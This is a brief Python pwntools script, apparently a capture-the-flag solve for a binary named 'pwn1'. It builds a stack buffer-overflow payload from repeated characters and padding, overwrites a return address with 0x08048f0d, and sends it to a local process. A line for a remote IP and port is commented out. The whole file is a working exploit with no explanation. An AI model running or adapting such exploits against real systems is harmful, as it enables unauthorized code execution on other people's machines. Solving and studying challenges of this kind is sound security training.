from pwn import *

context.log_level = "Debug"
io = process("./pwn1")
#io = remote("114.55.66.54", 10001)
gdb.attach(io)

payload = "I" * (0x40//3)
payload += "A" * (0x40%3)
payload += p32(0x08048f0d)
io.sendline(payload)
io.recv()
io.recv()
